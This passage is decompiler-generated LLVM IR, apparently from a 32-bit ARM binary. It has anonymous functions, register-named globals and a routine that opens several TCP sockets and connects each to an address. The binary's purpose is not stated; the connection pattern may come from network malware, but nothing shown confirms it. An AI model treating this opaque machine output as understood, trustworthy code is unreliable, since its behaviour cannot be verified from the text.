  store i32 %v2_d548, i32* @r0, align 4
  %v2_d54c = inttoptr i32 %v2_d548 to i8*
  %v3_d54c = call i32 @function_11214(i8* %v2_d54c, i32 %v0_d544)
  %v2_d554 = call i32 @function_111ec(i8* %v2_d1f8)
  %v0_d558 = load i32, i32* @r5, align 4
  store i32 %v2_d554, i32* @r4, align 4
  %v2_d564 = inttoptr i32 %v0_d558 to i32*
  %v3_d564 = call i32 @function_10b3c(i32 15, i32* %v2_d564)
  %v0_d56c = load i32, i32* @sl, align 4
  %v1_d56c = load i32, i32* @r4, align 4
  %v2_d56c = add i32 %v1_d56c, %v0_d56c
  store i32 %v2_d56c, i32* @r0, align 4
  %v2_d570 = inttoptr i32 %v2_d56c to i8*
  %v3_d570 = call i32 @function_11214(i8* %v2_d570, i32 %v3_d564)
  store i32 %v2_d1d8, i32* @r0, align 4
  %v1_d578 = call i32 @function_11ef8(i32 %v2_d1d8)
  store i32 %v1_d578, i32* @sb, align 4
  %v2_d57c = icmp eq i32 %v1_d578, 0
  br i1 %v2_d57c, label %dec_label_pc_d490.loopexit, label %dec_label_pc_d584.preheader

dec_label_pc_d584.preheader:                      ; preds = %dec_label_pc_d524
  %v1_d58840 = inttoptr i32 %v1_d578 to i32*
  %v2_d58841 = call i32 @function_11ff4(i32* %v1_d58840)
  store i32 %v2_d58841, i32* @r6, align 4
  %v2_d58c43 = icmp eq i32 %v2_d58841, 0
  store i32 4096, i32* @r1, align 4
  store i32 %v2_d1ec, i32* @r0, align 4
  br i1 %v2_d58c43, label %dec_label_pc_d68c, label %dec_label_pc_d59cthread-pre-split

dec_label_pc_d584.loopexit:                       ; preds = %dec_label_pc_d5a4, %dec_label_pc_d63c
  %v0_d584 = load i32, i32* @sb, align 4
  %v1_d588 = inttoptr i32 %v0_d584 to i32*
  %v2_d588 = call i32 @function_11ff4(i32* %v1_d588)
  store i32 %v2_d588, i32* @r6, align 4
  %v2_d58c = icmp eq i32 %v2_d588, 0
  store i32 4096, i32* @r1, align 4
  store i32 %v2_d1ec, i32* @r0, align 4
  br i1 %v2_d58c, label %dec_label_pc_d68c, label %dec_label_pc_d59cthread-pre-split

dec_label_pc_d59cthread-pre-split:                ; preds = %dec_label_pc_d584.preheader, %dec_label_pc_d584.loopexit
  %v0_d59c.pr = load i32, i32* @r5, align 4
  br label %dec_label_pc_d59c

dec_label_pc_d59c:                                ; preds = %dec_label_pc_d59cthread-pre-split, %dec_label_pc_d664
  %v0_d59c = phi i32 [ %v0_d59c.pr, %dec_label_pc_d59cthread-pre-split ], [ 1, %dec_label_pc_d664 ]
  %v2_d59c = icmp eq i32 %v0_d59c, 0
  br i1 %v2_d59c, label %dec_label_pc_d5a4, label %dec_label_pc_d68c

dec_label_pc_d5a4:                                ; preds = %dec_label_pc_d59c
  %v0_d5a4 = call i32 @function_1128c()
  %v0_d5a8 = load i32, i32* @r5, align 4
  %v2_d5b0 = inttoptr i32 %v0_d5a8 to i32*
  %v3_d5b0 = call i32 @function_10b3c(i32 13, i32* %v2_d5b0)
  store i32 %v2_d1d8, i32* @r0, align 4
  %v3_d5bc = call i32 @function_11214(i8* %v2_d1f8, i32 %v3_d5b0)
  %v2_d5c4 = call i32 @function_111ec(i8* %v2_d1f8)
  %v0_d5c8 = load i32, i32* @r7, align 4
  %v0_d5cc = load i32, i32* @sl, align 4
  %v2_d5cc = add i32 %v0_d5cc, %v2_d5c4
  store i32 %v2_d5cc, i32* @r0, align 4
  %v2_d5d0 = inttoptr i32 %v2_d5cc to i8*
  %v3_d5d0 = call i32 @function_11214(i8* %v2_d5d0, i32 %v0_d5c8)
  %v2_d5d8 = call i32 @function_111ec(i8* %v2_d1f8)
  %v0_d5dc = load i32, i32* @r5, align 4
  store i32 %v2_d5d8, i32* @r4, align 4
  %v2_d5e8 = inttoptr i32 %v0_d5dc to i32*
  %v3_d5e8 = call i32 @function_10b3c(i32 15, i32* %v2_d5e8)
  %v0_d5f0 = load i32, i32* @sl, align 4
  %v1_d5f0 = load i32, i32* @r4, align 4
  %v2_d5f0 = add i32 %v1_d5f0, %v0_d5f0
  store i32 %v2_d5f0, i32* @r0, align 4
  %v2_d5f4 = inttoptr i32 %v2_d5f0 to i8*
  %v3_d5f4 = call i32 @function_11214(i8* %v2_d5f4, i32 %v3_d5e8)
  %v2_d5fc = call i32 @function_111ec(i8* %v2_d1f8)
  %v0_d604 = load i32, i32* @sl, align 4
  %v2_d604 = add i32 %v0_d604, %v2_d5fc
  store i32 %v2_d604, i32* @r0, align 4
  %v2_d608 = inttoptr i32 %v2_d604 to i8*
  %v3_d608 = call i32 @function_11214(i8* %v2_d608, i32 ptrtoint (i32* @global_var_14364.61 to i32))
  %v2_d610 = call i32 @function_111ec(i8* %v2_d1f8)
  %v0_d614 = load i32, i32* @r6, align 4
  %v1_d614 = add i32 %v0_d614, 11
  %v0_d618 = load i32, i32* @sl, align 4
  %v2_d618 = add i32 %v0_d618, %v2_d610
  store i32 %v2_d618, i32* @r0, align 4
  %v2_d61c = inttoptr i32 %v2_d618 to i8*
  %v3_d61c = call i32 @function_11214(i8* %v2_d61c, i32 %v1_d614)
  %v4_d62c = call i32 @function_11ce4(i8* %v2_d1f8, i32 %v2_d1ec, i32 4096)
  %v7_d630 = icmp eq i32 %v4_d62c, -1
  br i1 %v7_d630, label %dec_label_pc_d584.loopexit, label %dec_label_pc_d63c

dec_label_pc_d63c:                                ; preds = %dec_label_pc_d5a4
  %v2_d63c = call i32 @function_111ec(i8* %v2_d210)
  store i32 %v2_d63c, i32* @r1, align 4
  %v4_d650 = call i32 @function_11540(i8* %v2_d210, i32 %v2_d63c, i32 %v2_d460.pre-phi)
  %v7_d654 = icmp eq i32 %v4_d650, -1
  br i1 %v7_d654, label %dec_label_pc_d584.loopexit, label %dec_label_pc_d664

dec_label_pc_d664:                                ; preds = %dec_label_pc_d63c
  %v0_d65c = load i32, i32* @r7, align 4
  %v2_d664 = inttoptr i32 %v0_d65c to i8*
  %v3_d664 = call i32 @function_11318(i8* %v2_d664, i32 10)
  %v2_d66c = call i32 @function_11bf0(i32 %v3_d664, i32 9)
  %v0_d670 = load i32, i32* @sb, align 4
  %v1_d674 = inttoptr i32 %v0_d670 to i32*
  %v2_d674 = call i32 @function_11ff4(i32* %v1_d674)
  store i32 %v2_d674, i32* @r6, align 4
  %v2_d678 = icmp eq i32 %v2_d674, 0
  store i32 1, i32* @r5, align 4
  store i32 4096, i32* @r1, align 4
  store i32 %v2_d1ec, i32* @r0, align 4
  br i1 %v2_d678, label %dec_label_pc_d68c, label %dec_label_pc_d59c

dec_label_pc_d68c:                                ; preds = %dec_label_pc_d584.loopexit, %dec_label_pc_d664, %dec_label_pc_d59c, %dec_label_pc_d584.preheader
  %v0_d68c = load i32, i32* @sb, align 4
  %v1_d690 = inttoptr i32 %v0_d68c to i32*
  %v2_d690 = call i32 @function_11e44(i32* %v1_d690)
  %v0_d694 = load i32, i32* @r8, align 4
  %v1_d698 = inttoptr i32 %v0_d694 to i32*
  %v2_d698 = call i32 @function_11ff4(i32* %v1_d698)
  %v2_d69c = icmp eq i32 %v2_d698, 0
  br i1 %v2_d69c, label %dec_label_pc_d6a4, label %dec_label_pc_d4a0

dec_label_pc_d6a4:                                ; preds = %dec_label_pc_d490.loopexit, %dec_label_pc_d68c, %dec_label_pc_d4a0, %dec_label_pc_d490.preheader
  %v0_d6a4 = load i32, i32* @r8, align 4
  %v1_d6a8 = inttoptr i32 %v0_d6a4 to i32*
  %v2_d6a8 = call i32 @function_11e44(i32* %v1_d6a8)
  %v0_d6ac = load i32, i32* @r5, align 4
  %v1_d6ac = urem i32 %v0_d6ac, 256
  br label %dec_label_pc_d6b0

dec_label_pc_d6b0:                                ; preds = %dec_label_pc_d470, %dec_label_pc_d6a4
  %storemerge = phi i32 [ %v1_d6ac, %dec_label_pc_d6a4 ], [ 0, %dec_label_pc_d470 ]
  store i32 %storemerge, i32* @r4, align 4
  %v1_d6b4 = call i32 @function_12efc(i32 1)
  %v1_d6bc = call i32 @function_10b68(i32 13)
  %v1_d6c4 = call i32 @function_10b68(i32 14)
  %v1_d6cc = call i32 @function_10b68(i32 15)
  br label %dec_label_pc_d6d0

dec_label_pc_d6d0:                                ; preds = %dec_label_pc_d274, %dec_label_pc_d710, %dec_label_pc_d6b0
  %v0_d6d0 = load i32, i32* @r4, align 4
  %v2_d6dc = load i32, i32* %stack_var_-36, align 4
  store i32 %v2_d6dc, i32* @r4, align 4
  store i32 %v6_d1c4, i32* @r5, align 4
  store i32 %v9_d1c4, i32* @r6, align 4
  store i32 %v12_d1c4, i32* @r7, align 4
  store i32 %v15_d1c4, i32* @r8, align 4
  store i32 %v18_d1c4, i32* @sb, align 4
  store i32 %v21_d1c4, i32* @sl, align 4
  store i32 %v24_d1c4, i32* @fp, align 4
  ret i32 %v0_d6d0

dec_label_pc_d6e0:                                ; preds = %dec_label_pc_d3c4
  %v1_d6e0 = add i32 %v0_d6e0, 1
  store i32 %v1_d6e0, i32* @lr, align 4
  %v7_d6e4 = icmp eq i32 %v0_d6e0, 0
  br i1 %v7_d6e4, label %dec_label_pc_d6ec, label %dec_label_pc_d3cc

dec_label_pc_d6ec:                                ; preds = %dec_label_pc_d6e0
  %v1_d6ec = add i32 %v0_d3d4, 3
  %v2_d6ec = inttoptr i32 %v1_d6ec to i8*
  %v3_d6ec = load i8, i8* %v2_d6ec, align 1
  %v7_d6f0 = icmp eq i8 %v3_d6ec, 65
  br i1 %v7_d6f0, label %dec_label_pc_d700, label %.thread33

.thread33:                                        ; preds = %dec_label_pc_d6ec
  br label %dec_label_pc_d39c.backedge

dec_label_pc_d700:                                ; preds = %dec_label_pc_d6ec
  store i32 %v1_d6e0, i32* @r4, align 4
  br label %dec_label_pc_d39c.backedge

dec_label_pc_d39c.backedge:                       ; preds = %.thread33, %dec_label_pc_d700, %dec_label_pc_d3d0
  %v0_d3dc85 = phi i32 [ %v1_d6e0, %dec_label_pc_d700 ], [ %v0_d3dc86, %dec_label_pc_d3d0 ], [ %v0_d3dc86, %.thread33 ]
  %v0_d6e074 = phi i32 [ %v1_d6e0, %dec_label_pc_d700 ], [ %v0_d3d0, %dec_label_pc_d3d0 ], [ %v1_d6e0, %.thread33 ]
  %v0_d3c4.pr71 = phi i32 [ 0, %dec_label_pc_d700 ], [ %v0_d3c4.pr72, %dec_label_pc_d3d0 ], [ 0, %.thread33 ]
  %v0_d39c = add i32 %v0_d3d4, 1
  %v1_d39c = add i32 %v0_d3d4, 3
  %v2_d39c = inttoptr i32 %v1_d39c to i8*
  %v3_d39c = load i8, i8* %v2_d39c, align 1
  %v2_d3a0 = icmp eq i8 %v3_d39c, 0
  %v1_d3a4 = add i32 %v0_d3a482, 1
  br i1 %v2_d3a0, label %dec_label_pc_d3dc, label %dec_label_pc_d3ac

dec_label_pc_d710:                                ; preds = %dec_label_pc_d454
  %v1_d714 = call i32 @function_10b68(i32 13)
  %v1_d71c = call i32 @function_10b68(i32 14)
  %v1_d724 = call i32 @function_10b68(i32 15)
  %v1_d72c = call i32 @function_10b68(i32 17)
  br label %dec_label_pc_d6d0

dec_label_pc_d734:                                ; preds = %dec_label_pc_d1c4
  store i8 48, i8* %stack_var_-68, align 1
  br label %dec_label_pc_d274

; uselistorder directives
  uselistorder i32 %v1_d3a4, { 1, 0 }
  uselistorder i8 %v3_d39c, { 1, 0 }
  uselistorder i32 %v0_d3dc85, { 1, 0 }
  uselistorder i32 %v1_d6e0, { 4, 3, 0, 2, 5, 1 }
  uselistorder i32 %v2_d698, { 1, 0 }
  uselistorder i32 %v1_d408, { 1, 0 }
  uselistorder i32 %v0_d41428, { 1, 0 }
  uselistorder i32 %v1_d42c, { 0, 3, 1, 2 }
  uselistorder i32 %v0_d3d0, { 1, 0 }
  uselistorder i32 %v0_d3a482, { 1, 0 }
  uselistorder i32 %v0_d6e0, { 4, 3, 0, 1, 2 }
  uselistorder i32 %v0_d3dc86, { 1, 2, 0 }
  uselistorder i32 %v1_d3a456, { 1, 0 }
  uselistorder i32 %v2_d388, { 1, 0 }
  uselistorder i32 %v1_d384, { 3, 1, 0, 2, 4, 5 }
  uselistorder i32 %v0_d34013, { 1, 0, 2 }
  uselistorder i32 %v0_d330, { 1, 0 }
  uselistorder i32 %v1_d310, { 0, 2, 3, 4, 5, 1 }
  uselistorder i32 %v3_d2a4, { 1, 2, 0 }
  uselistorder i32 %v2_d1ec, { 1, 2, 3, 0, 4 }
  uselistorder i32 %v2_d1d8, { 0, 2, 1, 3, 4, 5 }
  uselistorder i32* %stack_var_-36, { 0, 2, 1 }
  uselistorder i8* %stack_var_-581, { 1, 4, 0, 2, 3 }
  uselistorder i8* %stack_var_-68, { 2, 0, 1 }
  uselistorder i32* %stack_var_-52, { 0, 1, 2, 4, 3 }
  uselistorder i32 (i8*, i32)* @function_11318, { 1, 0 }
  uselistorder i32 (i8*, i32, i32)* @function_11444, { 1, 0 }
  uselistorder label %dec_label_pc_d39c.backedge, { 1, 0, 2 }
  uselistorder label %dec_label_pc_d6d0, { 1, 2, 0 }
  uselistorder label %dec_label_pc_d6b0, { 1, 0 }
  uselistorder label %dec_label_pc_d6a4, { 1, 2, 0, 3 }
  uselistorder label %dec_label_pc_d68c, { 1, 2, 0, 3 }
  uselistorder label %dec_label_pc_d59c, { 1, 0 }
  uselistorder label %dec_label_pc_d59cthread-pre-split, { 1, 0 }
  uselistorder label %dec_label_pc_d584.loopexit, { 1, 0 }
  uselistorder label %dec_label_pc_d4a0, { 1, 0 }
  uselistorder label %dec_label_pc_d4a0.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_d490.loopexit, { 2, 1, 0 }
  uselistorder label %dec_label_pc_d428, { 2, 1, 0 }
  uselistorder label %dec_label_pc_d3d0, { 2, 0, 1 }
  uselistorder label %dec_label_pc_d3ac, { 1, 0 }
  uselistorder label %dec_label_pc_d350, { 2, 0, 1 }
  uselistorder label %dec_label_pc_d2b4.backedge, { 2, 1, 3, 0 }
  uselistorder label %dec_label_pc_d304, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_d2cc, { 1, 0 }
  uselistorder label %dec_label_pc_d274, { 1, 0 }
}

define i32 @function_d760(i32 %arg1) local_unnamed_addr {
dec_label_pc_d760:
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-220 = alloca i32, align 4
  %stack_var_-284 = alloca i32, align 4
  %stack_var_-108 = alloca i32, align 4
  %stack_var_-92 = alloca i32, align 4
  %stack_var_-140 = alloca i32, align 4
  %stack_var_-124 = alloca i32, align 4
  %stack_var_-76 = alloca i32, align 4
  %stack_var_-60 = alloca i32, align 4
  %stack_var_-292 = alloca i32, align 4
  %stack_var_-8476 = alloca i32, align 4
  %stack_var_-156 = alloca i32, align 4
  %stack_var_-4380 = alloca i32, align 4
  %stack_var_-8484 = alloca i32, align 4
  %stack_var_-36 = alloca i32, align 4
  %v3_d760 = load i32, i32* @r4, align 4
  store i32 %v3_d760, i32* %stack_var_-36, align 4
  %v6_d760 = load i32, i32* @r5, align 4
  %v9_d760 = load i32, i32* @r6, align 4
  %v12_d760 = load i32, i32* @r7, align 4
  %v15_d760 = load i32, i32* @r8, align 4
  %v18_d760 = load i32, i32* @sb, align 4
  %v21_d760 = load i32, i32* @sl, align 4
  %v24_d760 = load i32, i32* @fp, align 4
  %v28_d760 = ptrtoint i32* %stack_var_-36 to i32
  %v2_d76c = call i32 @function_11dc0(i32* null)
  store i32 %v2_d76c, i32* @r7, align 4
  %v0_d774 = call i32 @function_11b1c()
  %v7_d778 = icmp eq i32 %v0_d774, -1
  %. = zext i1 %v7_d778 to i32
  %tmp130 = icmp slt i32 %v0_d774, 1
  %storemerge86 = select i1 %tmp130, i32 %., i32 1
  store i32 %storemerge86, i32* @r5, align 4
  store i32 ptrtoint (i32* @global_var_1cb24.63 to i32), i32* %r3.global-to-local, align 4
  %v2_d794 = icmp eq i32 %storemerge86, 0
  store i32 %v0_d774, i32* @global_var_1cb24.63, align 4
  br i1 %v2_d794, label %dec_label_pc_d7a8, label %dec_label_pc_d7a0

dec_label_pc_d7a0:                                ; preds = %dec_label_pc_d8bc, %dec_label_pc_d7a8, %dec_label_pc_d760
  %v29_d7a4 = phi i32 [ %v3_d84c, %dec_label_pc_d7a8 ], [ %v0_d774, %dec_label_pc_d760 ], [ 0, %dec_label_pc_d8bc ]
  %v2_d7a4 = load i32, i32* %stack_var_-36, align 4
  store i32 %v2_d7a4, i32* @r4, align 4
  store i32 %v6_d760, i32* @r5, align 4
  store i32 %v9_d760, i32* @r6, align 4
  store i32 %v12_d760, i32* @r7, align 4
  store i32 %v15_d760, i32* @r8, align 4
  store i32 %v18_d760, i32* @sb, align 4
  store i32 %v21_d760, i32* @sl, align 4
  store i32 %v24_d760, i32* @fp, align 4
  ret i32 %v29_d7a4

dec_label_pc_d7a8:                                ; preds = %dec_label_pc_d760
  %v1_d7ac = call i32 @function_12efc(i32 5)
  %v1_d7b4 = call i32 @function_12578(i32 4096)
  store i32 ptrtoint (i32* @global_var_1ca84.65 to i32), i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1cb20.67 to i32), i32* %r1.global-to-local, align 4
  store i32 %v1_d7b4, i32* %r2.global-to-local, align 4
  %v0_d7c4 = load i32, i32* @r5, align 4
  %v1_d7c4 = trunc i32 %v0_d7c4 to i8
  %v3_d7c4 = inttoptr i32 %v1_d7b4 to i8*
  store i8 %v1_d7c4, i8* %v3_d7c4, align 1
  %v0_d7cc = load i32, i32* @r5, align 4
  %v1_d7cc = load i32, i32* %r3.global-to-local, align 4
  %v2_d7cc = inttoptr i32 %v1_d7cc to i32*
  store i32 %v0_d7cc, i32* %v2_d7cc, align 4
  %v0_d7d0 = load i32, i32* %r2.global-to-local, align 4
  %v1_d7d0 = load i32, i32* %r1.global-to-local, align 4
  %v2_d7d0 = inttoptr i32 %v1_d7d0 to i32*
  store i32 %v0_d7d0, i32* %v2_d7d0, align 4
  %v1_d7d4 = call i32 @function_10c20(i32 13)
  %v1_d7dc = call i32 @function_10c20(i32 14)
  %v0_d7e0 = load i32, i32* @r5, align 4
  store i32 %v0_d7e0, i32* %r1.global-to-local, align 4
  %v2_d7e8 = inttoptr i32 %v0_d7e0 to i32*
  %v3_d7e8 = call i32 @function_10b3c(i32 13, i32* %v2_d7e8)
  %v2_d7f0 = ptrtoint i32* %stack_var_-4380 to i32
  store i32 %v2_d7f0, i32* @fp, align 4
  store i32 %v3_d7e8, i32* %r1.global-to-local, align 4
  store i32 %v2_d7f0, i32* @r0, align 4
  %v2_d7fc = bitcast i32* %stack_var_-4380 to i8*
  %v3_d7fc = call i32 @function_11214(i8* %v2_d7fc, i32 %v3_d7e8)
  %v0_d800 = load i32, i32* @fp, align 4
  %v2_d800 = add i32 %v0_d800, %v3_d7fc
  store i32 %v2_d800, i32* @r4, align 4
  %v0_d804 = call i32 @function_11b48()
  %v2_d80c = ptrtoint i32* %stack_var_-156 to i32
  store i32 %v2_d80c, i32* %r2.global-to-local, align 4
  store i32 10, i32* %r1.global-to-local, align 4
  %v3_d814 = trunc i32 %v0_d804 to i8
  %v4_d814 = call i32 @function_11650(i8 %v3_d814, i32 10, i32 %v2_d80c)
  store i32 %v4_d814, i32* %r1.global-to-local, align 4
  %v0_d81c = load i32, i32* @r4, align 4
  store i32 %v0_d81c, i32* @r0, align 4
  %v2_d820 = inttoptr i32 %v0_d81c to i8*
  %v3_d820 = call i32 @function_11214(i8* %v2_d820, i32 %v4_d814)
  %v0_d824 = load i32, i32* @r5, align 4
  store i32 %v0_d824, i32* %r1.global-to-local, align 4
  %v0_d828 = load i32, i32* @r4, align 4
  %v2_d828 = add i32 %v0_d828, %v3_d820
  store i32 %v2_d828, i32* @r4, align 4
  %v2_d830 = inttoptr i32 %v0_d824 to i32*
  %v3_d830 = call i32 @function_10b3c(i32 14, i32* %v2_d830)
  store i32 %v3_d830, i32* %r1.global-to-local, align 4
  %v0_d838 = load i32, i32* @r4, align 4
  store i32 %v0_d838, i32* @r0, align 4
  %v2_d83c = inttoptr i32 %v0_d838 to i8*
  %v3_d83c = call i32 @function_11214(i8* %v2_d83c, i32 %v3_d830)
  %v0_d840 = load i32, i32* @r5, align 4
  store i32 %v0_d840, i32* %r1.global-to-local, align 4
  store i32 %v3_d83c, i32* @r6, align 4
  %v3_d84c = call i32 @function_11c1c(i8* %v2_d7fc, i32 %v0_d840)
  %v7_d850 = icmp eq i32 %v3_d84c, -1
  br i1 %v7_d850, label %dec_label_pc_d7a0, label %dec_label_pc_d858

dec_label_pc_d858:                                ; preds = %dec_label_pc_d7a8
  %v1_d858 = call i32 @function_11af0(i32 %v3_d84c)
  %v1_d860 = call i32 @function_10b68(i32 13)
  %v1_d868 = call i32 @function_10b68(i32 14)
  store i32 ptrtoint (i32* @global_var_1cb20.67 to i32), i32* %r3.global-to-local, align 4
  %v2_d874 = load i32, i32* @global_var_1cb20.67, align 4
  store i32 %v2_d874, i32* %r1.global-to-local, align 4
  store i32 4095, i32* %r2.global-to-local, align 4
  %v4_d880 = call i32 @function_11ce4(i8* %v2_d7fc, i32 %v2_d874, i32 4095)
  %v7_d884 = icmp eq i32 %v4_d880, -1
  br i1 %v7_d884, label %.thread2.thread, label %bb133

.thread2.thread:                                  ; preds = %dec_label_pc_d858
  %v0_d89024 = load i32, i32* @r4, align 4
  %v1_d89025 = load i32, i32* @r6, align 4
  %v2_d89026 = add i32 %v1_d89025, %v0_d89024
  store i32 %v2_d89026, i32* %r1.global-to-local, align 4
  br label %bb134

bb133:                                            ; preds = %dec_label_pc_d858
  %v3_d88c = load i32, i32* @global_var_1cb20.67, align 4
  store i32 %v3_d88c, i32* %r3.global-to-local, align 4
  %v0_d890 = load i32, i32* @r4, align 4
  %v1_d890 = load i32, i32* @r6, align 4
  %v2_d890 = add i32 %v1_d890, %v0_d890
  store i32 %v2_d890, i32* %r1.global-to-local, align 4
  %v1_d894 = load i32, i32* @r5, align 4
  %v2_d894 = trunc i32 %v1_d894 to i8
  %v5_d894 = add i32 %v3_d88c, %v4_d880
  %v6_d894 = inttoptr i32 %v5_d894 to i8*
  store i8 %v2_d894, i8* %v6_d894, align 1
  %v1_d898.pre = load i32, i32* %r1.global-to-local, align 4
  br label %bb134

bb134:                                            ; preds = %.thread2.thread, %bb133
  %v1_d898 = phi i32 [ %v2_d89026, %.thread2.thread ], [ %v1_d898.pre, %bb133 ]
  %v0_d898 = load i32, i32* @fp, align 4
  %v2_d898 = sub i32 %v1_d898, %v0_d898
  store i32 %v2_d898, i32* @r1, align 4
  store i32 %v2_d7f0, i32* @r0, align 4
  %v0_d8a0 = call i32 @function_1128c()
  store i32 0, i32* %r1.global-to-local, align 4
  %v0_d8b0 = load i32, i32* @r7, align 4
  store i32 %v0_d8b0, i32* @r5, align 4
  %v2_d8b4 = ptrtoint i32* %stack_var_-8476 to i32
  store i32 %v2_d8b4, i32* @sl, align 4
  store i32 400, i32* @r8, align 4
  %v2_d9a0 = ptrtoint i32* %stack_var_-292 to i32
  %v2_dbf0 = ptrtoint i32* %stack_var_-284 to i32
  %v2_dbf4 = bitcast i32* %stack_var_-284 to i8*
  %v2_dc40 = ptrtoint i32* %stack_var_-220 to i32
  %v2_dc44 = bitcast i32* %stack_var_-220 to i8*
  %v2_dd9c = ptrtoint i32* %stack_var_-40 to i32
  %v2_ddb0 = ptrtoint i32* %stack_var_-44 to i32
  %v2_db0c = ptrtoint i32* %stack_var_-108 to i32
  %v3_db14 = bitcast i32* %stack_var_-108 to %sockaddr*
  %v2_dad4 = ptrtoint i32* %stack_var_-92 to i32
  %v3_dadc = bitcast i32* %stack_var_-92 to %sockaddr*
  %v2_da9c = ptrtoint i32* %stack_var_-140 to i32
  %v3_daa4 = bitcast i32* %stack_var_-140 to %sockaddr*
  %v2_da64 = ptrtoint i32* %stack_var_-124 to i32
  %v3_da6c = bitcast i32* %stack_var_-124 to %sockaddr*
  %v2_da2c = ptrtoint i32* %stack_var_-76 to i32
  %v3_da34 = bitcast i32* %stack_var_-76 to %sockaddr*
  %v2_d9e4 = ptrtoint i32* %stack_var_-60 to i32
  %v3_d9ec = bitcast i32* %stack_var_-60 to %sockaddr*
  br label %dec_label_pc_d8bc

dec_label_pc_d8bc:                                ; preds = %dec_label_pc_dbb4, %bb134
  %stack_var_-8480.0 = phi i32 [ 0, %bb134 ], [ %stack_var_-8480.3, %dec_label_pc_dbb4 ]
  %v1_d8c0 = call i32 @function_10c20(i32 13)
  store i32 0, i32* %r1.global-to-local, align 4
  %v3_d8cc = call i32 @function_10b3c(i32 13, i32* null)
  store i32 %v3_d8cc, i32* @r0, align 4
  %v1_d8d0 = call i32 @function_11ef8(i32 %v3_d8cc)
  store i32 %v1_d8d0, i32* @sb, align 4
  %v2_d8d4 = icmp eq i32 %v1_d8d0, 0
  br i1 %v2_d8d4, label %dec_label_pc_d7a0, label %dec_label_pc_d8dc

dec_label_pc_d8dc:                                ; preds = %dec_label_pc_d8bc
  %v1_d8e0 = call i32 @function_10b68(i32 13)
  %v1_d8ec = call i32 @function_d1c4(i32 58811)
  %v1_d8f8 = call i32 @function_d1c4(i32 50951)
  %v1_d904 = call i32 @function_d1c4(i32 14853)
  %v1_d90c = call i32 @function_d1c4(i32 20480)
  %v1_d918 = call i32 @function_d1c4(i32 47873)
  %v1_d924 = call i32 @function_d1c4(i32 57616)
  %v1_d930 = call i32 @function_d1c4(i32 2842)
  %v1_d93c = call i32 @function_d1c4(i32 10522)
  %v1_d944 = call i32 @function_d1c4(i32 5632)
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  %v3_d9d0 = call i32 @function_123e0(i32 2, i32 1, i32 0)
  %v7_d9d4 = icmp eq i32 %v3_d9d0, -1
  store i32 %v3_d9d0, i32* @r4, align 4
  br i1 %v7_d9d4, label %dec_label_pc_d9fc, label %dec_label_pc_d9e0

dec_label_pc_d9e0:                                ; preds = %dec_label_pc_d8dc
  store i32 %v2_d9e4, i32* %r1.global-to-local, align 4
  store i32 16, i32* %r2.global-to-local, align 4
  %v4_d9ec = call i32 @function_12210(i32 %v3_d9d0, %sockaddr* %v3_d9ec, i32 16)
  %v0_d9f0 = load i32, i32* @r4, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  %v2_d9f8 = call i32 @function_122c4(i32 %v0_d9f0, i32 1)
  br label %dec_label_pc_d9fc

dec_label_pc_d9fc:                                ; preds = %dec_label_pc_d8dc, %dec_label_pc_d9e0
  %v1_da00 = call i32 @function_d1c4(i32 5888)
  %v2_da04 = icmp eq i32 %v1_da00, 0
  br i1 %v2_da04, label %dec_label_pc_dec8, label %dec_label_pc_da0c

dec_label_pc_da0c:                                ; preds = %dec_label_pc_deec, %dec_label_pc_dedc, %dec_label_pc_dec8, %dec_label_pc_d9fc, %dec_label_pc_df00
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  %v3_da18 = call i32 @function_123e0(i32 2, i32 1, i32 0)
  %v7_da1c = icmp eq i32 %v3_da18, -1
  store i32 %v3_da18, i32* @r4, align 4
  br i1 %v7_da1c, label %dec_label_pc_da44, label %dec_label_pc_da28

dec_label_pc_da28:                                ; preds = %dec_label_pc_da0c
  store i32 %v2_da2c, i32* %r1.global-to-local, align 4
  store i32 16, i32* %r2.global-to-local, align 4
  %v4_da34 = call i32 @function_12210(i32 %v3_da18, %sockaddr* %v3_da34, i32 16)
  %v0_da38 = load i32, i32* @r4, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  %v2_da40 = call i32 @function_122c4(i32 %v0_da38, i32 1)
  br label %dec_label_pc_da44

dec_label_pc_da44:                                ; preds = %dec_label_pc_da0c, %dec_label_pc_da28
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  %v3_da50 = call i32 @function_123e0(i32 2, i32 1, i32 0)
  %v7_da54 = icmp eq i32 %v3_da50, -1
  store i32 %v3_da50, i32* @r4, align 4
  br i1 %v7_da54, label %dec_label_pc_da7c, label %dec_label_pc_da60

dec_label_pc_da60:                                ; preds = %dec_label_pc_da44
  store i32 %v2_da64, i32* %r1.global-to-local, align 4
  store i32 16, i32* %r2.global-to-local, align 4
  %v4_da6c = call i32 @function_12210(i32 %v3_da50, %sockaddr* %v3_da6c, i32 16)
  %v0_da70 = load i32, i32* @r4, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  %v2_da78 = call i32 @function_122c4(i32 %v0_da70, i32 1)
  br label %dec_label_pc_da7c

dec_label_pc_da7c:                                ; preds = %dec_label_pc_da44, %dec_label_pc_da60
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  %v3_da88 = call i32 @function_123e0(i32 2, i32 1, i32 0)
  %v7_da8c = icmp eq i32 %v3_da88, -1
  store i32 %v3_da88, i32* @r4, align 4
  br i1 %v7_da8c, label %dec_label_pc_dab4, label %dec_label_pc_da98

dec_label_pc_da98:                                ; preds = %dec_label_pc_da7c
  store i32 %v2_da9c, i32* %r1.global-to-local, align 4
  store i32 16, i32* %r2.global-to-local, align 4
  %v4_daa4 = call i32 @function_12210(i32 %v3_da88, %sockaddr* %v3_daa4, i32 16)
  %v0_daa8 = load i32, i32* @r4, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  %v2_dab0 = call i32 @function_122c4(i32 %v0_daa8, i32 1)
